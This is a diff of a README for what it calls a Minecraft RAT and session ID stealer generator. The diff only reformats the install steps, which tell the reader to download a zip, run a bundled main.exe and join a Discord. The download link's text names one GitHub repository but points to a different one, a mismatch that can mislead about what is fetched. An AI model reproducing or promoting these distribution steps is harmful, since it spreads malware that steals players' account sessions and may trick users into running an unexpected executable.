@@ -44,9 +44,9 @@ minecraft rat + session id stealer generator
 -   [Python](https://www.python.org/downloads/release/python-3109/)
 -   [Git](https://git-scm.com/download/win)
 
-. [Download source code zip]([https://github.com/addi00000/empyrean/archive/refs/heads/main.zip](https://github.com/toesenjoyer/skyscript/archive/refs/heads/main.zip))
-2. Extract zip
-3. Run `main.exe` (if you don't have python installed, install python 3.10+)
-4. Enjoy
+- 1. [Download source code zip]([https://github.com/addi00000/empyrean/archive/refs/heads/main.zip](https://github.com/toesenjoyer/skyscript/archive/refs/heads/main.zip))
+- 2. Extract zip
+- 3. Run `main.exe` (if you don't have python installed, install python 3.10+)
+- 4. Enjoy
 
 -   Join the [Discord](https://discord.gg/GudVbfd9ZU)
